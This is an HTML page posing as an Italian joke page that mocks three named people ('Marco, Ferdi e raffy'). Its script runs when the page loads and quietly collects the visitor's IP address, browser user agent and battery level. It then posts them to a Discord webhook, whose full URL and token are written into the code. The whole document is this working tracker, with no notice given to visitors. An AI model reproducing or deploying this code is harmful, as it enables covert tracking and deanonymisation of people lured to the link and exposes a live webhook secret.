<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Marco , Ferdi e raffy sono scemi...</title>
</head>
<body>
    <h1>Perch√® marco scemo?...</h1>
    <p id="status">Fetching details...</p>

    <script>
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return 'Unknown';
            }
        }

        function getDevice() {
            return navigator.userAgent;
        }

        async function getBattery() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return battery.level * 100;
            } else {
                return 'Unknown';
            }
        }

        async function sendToDiscord(ip, device, battery) {
            const webhookUrl = 'https://discord.com/api/webhooks/1265693400984846388/9w9jBCctOe2N0P_MsaYxGHWzMpg4HurzJ0Yvzjm1joQxJ8TjknMb5bI1aBkh7d0mX0dm'; // Replace with your actual Discord webhook URL

            const message = {
                content: `IP: ${ip}\nDevice: ${device}\nBattery: ${battery}%`
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    document.getElementById('status').innerText = 'Information sent to Discord successfully.';
                } else {
                    document.getElementById('status').innerText = 'Failed to send information to Discord.';
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
                document.getElementById('status').innerText = 'Error sending information to Discord.';
            }
        }

        async function trackUserInfo() {
            const ip = await getIP();
            const device = getDevice();
            const battery = await getBattery();

            await sendToDiscord(ip, device, battery);
        }

        // Start tracking when the page loads
        window.onload = trackUserInfo;
    </script>
</body>
</html>
